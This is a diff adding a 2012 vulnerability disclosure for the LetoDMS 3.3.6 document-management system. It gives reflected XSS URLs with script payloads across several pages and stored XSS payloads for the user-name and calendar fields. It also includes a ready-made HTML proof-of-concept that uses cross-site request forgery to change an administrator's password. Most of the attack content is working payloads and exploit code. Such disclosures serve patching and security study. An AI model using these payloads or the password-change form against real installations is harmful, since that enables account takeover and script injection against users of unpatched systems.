@@ -1,0 +1,80 @@
+# Exploit Title: LetoDMS 3.3.6 Multiple Reflected/Stored XSS & Password Change CSRF Vulnerability
+# Date: 23/08/2012
+# Exploit Author: Shai rod (@NightRang3r)
+# Vendor Homepage: http://www.letodms.com/
+# Software Link: http://sourceforge.net/projects/mydms/files/LetoDMS/LetoDMS-3.3.6/
+# Version: 3.3.6
+ 
+#Gr33Tz: @aviadgolan , @benhayak, @nirgoldshlager, @roni_bachar
+
+
+About the Application:
+======================
+
+LetoDMS is an open-source document-management-system based on PHP and MySQL published under the GPL.
+
+
+Vulnerability Description
+=========================
+
+1. Reflected XSS in Login Page.
+
+http://server/letodms/out/out.Login.php?referuri='><script>alert("XSS")</script>
+
+
+Here are some more locations that are vulnerable to reflected XSS:
+
+http://server/letodms/out/out.ViewDocument.php?documentid=2&showtree=%22%3E%3Cscript%3Ealert%280%29%3C/script%3E
+http://server/letodms/out/out.FolderNotify.php?folderid=1&showtree=1%22%3E%3Cscript%3Ealert%281%29%3C/script%3E
+http://server/letodms/out/out.FolderAccess.php?folderid=1&showtree=1"><script>alert(1)</script>
+http://server/letodms/out/out.EditFolder.php?folderid=1&showtree=1"><script>alert(1)</script>
+
+And lots more...
+
+
+
+2. Stored XSS in Document Owner/User name (when viewing user document).
+
+Steps to reproduce the issue:
+
+2.1. Goto My Account.
+2.2. Edit user details.
+2.3. In the "Name" field insert: <img src='1.jpg'onerror=javascript:alert(0)>
+2.4. Upload a document.
+2.5. View document information.
+2.6. XSS Should be triggered.
+
+Payload in context of the page source:
+
+<tr>
+<td>Owner:</td>
+<td>
+<a class="infos" href="mailto:aaa@aaa.com"><img src='1.jpg'onerror=javascript:alert(0)></a></td>
+</tr>
+
+
+3. Stored XS in Calendar.
+
+
+Steps to reproduce the issue:
+
+3.1. Create a new event.
+3.2. In the "Name" and "Comment" fields insert: <script>alert("XSS")</script>
+3.3. XSS should be triggerd when viewing the event.
+
+
+4. Change Password CSRF.
+
+<html>
+  <body>
+    <form action="http://server/letodms/op/op.EditUserData.php" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="pwd" value="qwe123" />
+      <input type="hidden" name="pwdconf" value="qwe123" />
+      <input type="hidden" name="fullname" value="Administrator" />
+      <input type="hidden" name="email" value="admin@domain.com" />
+      <input type="hidden" name="comment" value="CSRF POC" />
+      <input type="submit" value="Click Me" />
+    </form>
+  </body>
+</html>
+
